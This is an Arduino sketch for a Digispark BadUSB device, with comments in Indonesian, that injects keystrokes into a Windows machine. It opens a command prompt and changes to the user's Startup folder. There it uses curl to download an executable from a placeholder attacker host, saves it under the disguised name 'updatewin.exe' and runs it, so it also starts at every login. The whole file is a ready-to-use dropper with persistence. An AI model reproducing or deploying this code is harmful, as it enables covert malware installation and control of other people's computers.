#include "DigiKeyboard.h"

#define KEY_DOWN 0x51
#define KEY_ENTER 0x28
#define KEY_TAB 43

void setup() {
  pinMode(1, OUTPUT);
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  digitalWrite(1, HIGH);

  DigiKeyboard.delay(3000); // Biarkan OS siap menerima input

  // Open Run
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000); // Tunggu CMD terbuka

  // Masuk ke folder startup
  DigiKeyboard.println("cd %APPDATA%");
  DigiKeyboard.delay(800);
  DigiKeyboard.println("cd Microsoft\\Windows\\Start Menu\\Programs\\Startup");
  DigiKeyboard.delay(800);

  // Download exe
  DigiKeyboard.println("curl http://IP_LU/test.exe --output updatewin.exe");
  DigiKeyboard.delay(15000); // Biarkan waktu untuk download

  // Eksekusi file
  DigiKeyboard.println("start updatewin.exe");
  DigiKeyboard.delay(1500);

  // Exit CMD
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(300);
}

void loop() {
  digitalWrite(1, LOW);
  delay(100);
  digitalWrite(1, HIGH);
  delay(100);
}
